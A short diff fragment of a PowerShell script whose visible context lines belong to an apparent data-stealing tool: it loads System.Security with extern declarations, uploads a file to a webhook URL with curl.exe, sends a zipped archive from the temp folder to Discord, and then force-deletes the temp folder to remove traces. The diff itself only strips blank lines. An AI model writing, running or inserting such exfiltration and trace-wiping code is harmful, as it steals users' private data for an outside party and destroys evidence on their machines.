@@ -1,4 +1,3 @@
-
 $d=Add-Type -A System.Security
 $p='public static'
 $g=""")]$p extern"
@@ -50,5 +49,3 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 Upload-Discord -file "$env:tmp/$ZIP"
 "kek3"
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-
-
